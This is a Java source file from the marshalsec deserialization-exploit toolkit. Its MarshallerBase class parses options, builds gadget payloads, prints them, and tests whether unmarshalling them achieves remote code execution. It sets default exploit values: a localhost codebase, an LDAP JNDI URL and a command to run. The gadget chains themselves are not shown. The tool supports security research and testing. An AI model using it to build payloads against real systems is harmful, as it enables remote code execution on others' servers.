/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec;


import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import marshalsec.gadgets.Args;
import marshalsec.gadgets.GadgetType;
import marshalsec.gadgets.Primary;
import marshalsec.gadgets.ToStringUtil;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import sun.reflect.generics.reflectiveObjects.NotImplementedException;


/**
 * @author mbechler
 */
public abstract class MarshallerBase<T> implements UtilFactory {

	private final static Logger logger = LoggerFactory.getLogger(MarshallerBase.class);

	public static final String defaultCodebase = "{exploit.codebase:http://localhost:8080/}";

	public static final String defaultCodebaseClass = "{exploit.codebaseClass:Exploit}";

	public static final String defaultJNDIUrl = "{exploit.jndiUrl:ldap://localhost:1389/obj}";

	public static final String defaultExecutable = "{exploit.exec:/usr/bin/gedit}";

	private Map<GadgetType, String> payload;

	public abstract T marshal(Object o) throws Exception;

	public abstract Object unmarshal(T data) throws Exception;


	@Override
	public Object makeToStringTriggerUnstable(Object obj) throws Exception {
		return ToStringUtil.makeSpringAOPToStringTrigger(obj);
	}

	public void run(Configuration configuration) throws Exception {

		this.payload = new HashMap<>();

		if (configuration.isAll()) {
			runAll(configuration.isTest(),
				configuration.isVerbose(),
				false,
				configuration.getEscapeType());
		} else {
			// TODO impl
			throw new NotImplementedException();
			// String[] gadgetArgs = new String[args.length - argoff];
			// System.arraycopy(args, argoff, gadgetArgs, 0, args.length - argoff);

			// doRun(type, test, verbose, false, escape, gadgetArgs);
		}
	}

	/**
	 * @param args
	 */
	protected void run(String[] args) {
		try {
			boolean test = false;
			boolean all = false;
			boolean verbose = false;
			EscapeType escape = EscapeType.NONE;
			int argoff = 0;
			GadgetType type = null;

			while (argoff < args.length && args[argoff].charAt(0) == '-') {

				switch (args[argoff]) {
					case "-t":
						test = true;
						argoff++;
						break;
					case "-a":
						all = true;
						argoff++;
						break;
					case "-e":
						argoff++;
						escape = EscapeType.valueOf(args[argoff]);
						argoff++;
						break;
					case "-v":
						verbose = true;
						argoff++;
						break;
					default:
						argoff++;
						break;
				}
			}

			try {
				if (!all && args.length > argoff) {
					type = GadgetType.valueOf(args[argoff].trim());
					argoff++;
				}
			} catch (IllegalArgumentException e) {
				logger.error("Unsupported gadget type " + args[argoff]);
				return;
			}

			if (!all && type == null) {
				logger.error("No gadget type specified, available are " + Arrays
					.toString(getSupportedTypes()));
				return;
			}

			this.payload = new HashMap<>();

			if (all) {
				runAll(test, verbose, false, escape);
			} else {
				String[] gadgetArgs = new String[args.length - argoff];
				System.arraycopy(args, argoff, gadgetArgs, 0, args.length - argoff);

				doRun(type, test, verbose, false, escape, gadgetArgs);
			}
		} catch (Exception e) {
			logger.error("Exception in Marshelsec run.", e);
		}
	}

	/**
	 * get generated payload from Marshaller
	 */
	public Map<GadgetType, String> getPayload() {
		if (payload == null) {
			return new HashMap<>();
		}

		return payload;
	}


	public void runTests() throws Exception {
		runAll(true, false, true, EscapeType.NONE);
	}


	private void runAll(boolean test, boolean verbose, boolean throwEx, EscapeType escape)
		throws Exception {

		for (GadgetType t : this.getSupportedTypes()) {
			Method tm = getTargetMethod(t);
			Args a = tm.getAnnotation(Args.class);
			if (a == null) {
				throw new Exception("Missing Args in " + t);
			}
			if (a.noTest()) {
				continue;
			}
			String[] defaultArgs = a.defaultArgs();
			doRun(t, test, verbose, throwEx, escape, defaultArgs);
		}
	}


	/**
	 * @param type
	 * @param test
	 * @param escape
	 * @param gadgetArgs
	 * @throws Exception
	 * @throws IOException
	 */
	private void doRun(GadgetType type, boolean test, boolean verbose, boolean throwEx,
		EscapeType escape, String[] gadgetArgs)
		throws Exception, IOException {
		T marshal;
		try {
			System.setSecurityManager(new SideEffectSecurityManager());
			Object o = createObject(type, expandArguments(gadgetArgs));
			if (o instanceof byte[] || o instanceof String) {
				// already marshalled by delegate
				@SuppressWarnings("unchecked")
				T alreadyMarshalled = (T) o;
				marshal = alreadyMarshalled;
			} else {
				marshal = marshal(o);
			}
		} finally {
			System.setSecurityManager(null);
		}

		if (!test || verbose) {
			System.err.println();
			writeOutput(marshal, escape, type);
		}

		if (test) {
			logger.info("Running gadget " + type + ":");
			test(marshal, throwEx);
		}
	}


	/**
	 * @param gadgetArgs
	 * @return
	 */
	private static String[] expandArguments(String[] gadgetArgs) {
		String[] expanded = new String[gadgetArgs.length];

		for (int i = 0; i < gadgetArgs.length; i++) {
			expanded[i] = expandArgument(gadgetArgs[i]);
		}

		return expanded;
	}


	/**
	 * @param string
	 * @return
	 */
	private static String expandArgument(String string) {
		if (string.charAt(0) == '{' && string.charAt(string.length() - 1) == '}') {
			int defSep = string.indexOf(':', 1);
			String key;
			String defVal = null;
			if (defSep >= 0) {
				key = string.substring(1, defSep);
				defVal = string.substring(defSep + 1, string.length() - 1);
			} else {
				key = string.substring(1, string.length() - 1);
			}
			return System.getProperty(key, defVal);
		}
		return string;
	}


	/**
	 * @param marshal
	 */
	private void test(T marshal, boolean throwEx) throws Exception {
		Throwable ex = null;
		TestingSecurityManager s = new TestingSecurityManager();
		try {
			System.setSecurityManager(s);
			unmarshal(marshal);
		} catch (Exception e) {
			ex = extractInnermost(e);
		} finally {
			System.setSecurityManager(null);
		}

		try {
			s.assertRCE();
		} catch (Exception e) {
			logger.error("Failed to achieve RCE:", e.getMessage());
			if (ex != null) {
				logger.error("Throwable: ", ex);
			}
			if (throwEx) {
				if (ex instanceof Exception) {
					throw (Exception) ex;
				}
				throw e;
			}
		}
	}


	/**
	 * @param e
	 * @return
	 */
	private static Throwable extractInnermost(Throwable e) {
		if (e.getCause() != null && e.getCause() != e) {
			return extractInnermost(e.getCause());
		}
		return e;
	}


	/**
	 * @throws IOException
	 */
	private void writeOutput(T data, EscapeType escape, GadgetType gadgetType) throws IOException {
		if (data instanceof byte[]) {
			System.out.write((byte[]) data);
		} else if (data instanceof String) {
			switch (escape) {
				case JAVA:
					System.out.println(escapeJavaString((String) data));
					this.payload.put(gadgetType, escapeJavaString((String) data));
					break;
				default:
					System.out.println((String) data);
					this.payload.put(gadgetType, (String) data);
			}
		} else {
			throw new UnsupportedOperationException();
		}
	}


	/**
	 * @param data
	 * @return
	 */
	private static String escapeJavaString(String data) {
		return data.replaceAll("([\"\\\\])", "\\\\$1");
	}


	/**
	 * @param args
	 * @return
	 * @throws Exception
	 */
	private Object createObject(GadgetType t, String[] args) throws Exception {
		Method m = getTargetMethod(t);

		if (!t.getClazz().isAssignableFrom(this.getClass())) {
			throw new Exception("Gadget not supported for this marshaller");
		}

		Args a = m.getAnnotation(Args.class);

		if (a != null) {
			if (args.length < a.minArgs()) {
				throw new Exception(
					String.format("Gadget %s requires %d arguments: %s", t, a.minArgs(),
						Arrays.toString(a.args())));
			}
		}
		return m.invoke(this, this, args);
	}


	public GadgetType[] getSupportedTypes() {
		List<GadgetType> types = new LinkedList<>();
		for (GadgetType t : GadgetType.values()) {
			if (t.getClazz().isAssignableFrom(this.getClass())) {
				types.add(t);
			}
		}
		return types.toArray(new GadgetType[types.size()]);
	}


	/**
	 * @param t
	 * @return
	 * @throws Exception
	 */
	private Method getTargetMethod(GadgetType t) throws Exception {
		Method[] methods = t.getClazz().getMethods();
		Method m = null;
		if (methods.length != 1) {
			for (Method cand : methods) {
				if (cand.getAnnotation(Primary.class) != null) {
					m = cand;
					break;
				}
			}

			if (m == null) {
				throw new Exception("Gadget interface contains no or multiple methods");
			}
		} else {
			m = methods[0];
		}

		return this.getClass().getMethod(m.getName(), m.getParameterTypes());
	}
}
